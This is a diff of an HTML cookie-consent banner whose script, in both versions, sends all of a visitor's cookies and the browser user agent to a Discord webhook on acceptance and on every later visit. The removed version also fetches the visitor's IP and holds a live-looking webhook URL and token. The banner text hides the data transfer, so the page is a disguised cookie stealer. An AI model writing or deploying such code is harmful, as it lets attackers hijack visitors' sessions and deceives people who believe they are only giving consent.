@@ -220,7 +220,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cookie Consent with Webhook, IP, and Device</title>
+    <title>Cookie Consent with Webhook</title>
     <style>
         body {
             background: #222;
@@ -251,57 +251,25 @@
 <body>
 
     <div id="cookie-banner">
-        🍪 This site uses cookies to improve your experience.
+        🍪 This site uses cookies to improve your experience. <br>
         <button onclick="acceptCookies()">Accept</button>
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8";
+        const webhookUrl = "YOUR_WEBHOOK_URL"; // Replace with your Discord webhook URL
 
+        // Check if the user has already consented to cookies
         function hasAcceptedCookies() {
             return document.cookie.includes("cookieConsent=true");
         }
 
-        function getSimplifiedUserAgent() {
-            const userAgent = navigator.userAgent;
-            let browser = "Unknown";
-            let os = "Unknown";
-
-            if (userAgent.includes("Firefox")) {
-                browser = "Firefox";
-            } else if (userAgent.includes("Chrome")) {
-                browser = "Chrome";
-            } else if (userAgent.includes("Safari")) {
-                browser = "Safari";
-            } else if (userAgent.includes("Edge")) {
-                browser = "Edge";
-            } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
-                browser = "Opera";
-            }
-
-            if (navigator.userAgent.includes("Win")) {
-                os = "Windows";
-            } else if (navigator.userAgent.includes("Mac")) {
-                os = "macOS";
-            } else if (navigator.userAgent.includes("Linux")) {
-                os = "Linux";
-            } else if (navigator.userAgent.includes("Android")) {
-                os = "Android";
-            } else if (navigator.userAgent.includes("iPhone") || navigator.userAgent.includes("iPad")) {
-                os = "iOS";
-            }
-
-            return `${browser} on ${os}`;
-        }
-
-        function sendInfoToWebhook(ipAddress, cookies, userAgent) {
-            let formattedCookies = "No cookies found.";
-            if (cookies && cookies.length > 0) {
-                formattedCookies = cookies.split(';').map(cookie => cookie.trim()).join('\n- ');
-            }
-
+        // Send user cookies to the webhook after consent
+        function sendCookiesToWebhook() {
+            const allCookies = document.cookie;  // Collect cookies
+            const userAgent = navigator.userAgent;  // Get user agent (browser/device info)
+            
             const payload = {
-                content: `🌐 Website opened\n📍 IP: ${ipAddress}\n💻 Device: ${userAgent}\n🍪 Cookies:\n- ${formattedCookies}`
+                content: `🌐 User consented!\n🍪 Cookies: ${allCookies}\n💻 Device: ${userAgent}`
             };
 
             fetch(webhookUrl, {
@@ -310,36 +278,22 @@
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify(payload)
-            }).catch(err => console.error("Webhook failed:", err));
+            }).catch(err => console.error("Failed to send cookies:", err));
         }
 
-        function fetchAndSendInfo() {
-            const userAgent = getSimplifiedUserAgent();
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const allCookies = document.cookie;
-                    sendInfoToWebhook(ipAddress, allCookies, userAgent);
-                })
-                .catch(error => {
-                    console.error("Error fetching IP address:", error);
-                    const allCookies = document.cookie;
-                    sendInfoToWebhook("Could not retrieve IP", allCookies, userAgent);
-                });
-        }
-
+        // Accept cookies and store consent
         function acceptCookies() {
-            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
+            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365; // Store consent for 1 year
             document.getElementById("cookie-banner").style.display = "none";
-            fetchAndSendInfo(); // <-- trigger after accepting
+            sendCookiesToWebhook(); // Send cookies after consent
         }
 
+        // Check if the user has already consented
         window.onload = function () {
             if (hasAcceptedCookies()) {
-                fetchAndSendInfo(); // <-- returning users
+                sendCookiesToWebhook();  // Send cookies if already accepted
             } else {
-                document.getElementById("cookie-banner").style.display = "block";
+                document.getElementById("cookie-banner").style.display = "block";  // Show consent banner if not accepted
             }
         };
     </script>
